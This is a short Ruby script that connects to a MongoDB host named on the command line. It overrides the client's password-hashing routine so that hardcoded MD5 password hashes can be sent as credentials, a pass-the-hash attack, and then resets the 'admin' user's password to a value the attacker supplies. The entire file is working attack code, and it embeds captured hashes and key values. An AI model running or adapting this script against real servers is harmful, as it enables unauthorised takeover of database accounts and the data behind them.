#!/usr/bin/env ruby
require 'mongo'

#$NONCE = '28cf33f22c110199'
#$AUTH_KEY = '6b079a01f6bb2ca4f158cbadc443fafa'

#$ZDEBUG = 1

#$HASHPWD = '92d64f9e81715a4159fad506e45a77d1'

module Mongo
  module Support
    def hash_password username, pass
#      p [username,pass]
      pass
    end
  end
end

@passes = {}
@passes['nfs'] = %w'92d64f9e81715a4159fad506e45a77d1 3a75211be980547895dac0b6b1c3ec6b'
@passes['admin']= %w'65421288ebf0922c3ffe4b3da9be5c3f'

def change_admin_pass host, user, db, new_pass
  db = Mongo::Connection.new(host).db(db)
  @passes[user].each do |pass|
    puts "AUTH #{pass}"
    begin
      db.authenticate user, pass
      break
    rescue
      return
    end
  end

  if user=='admin'
    db.add_user 'admin',new_pass
    puts "OK"
  end
end

host, newpass = ARGV
change_admin_pass host, "admin", "admin", newpass

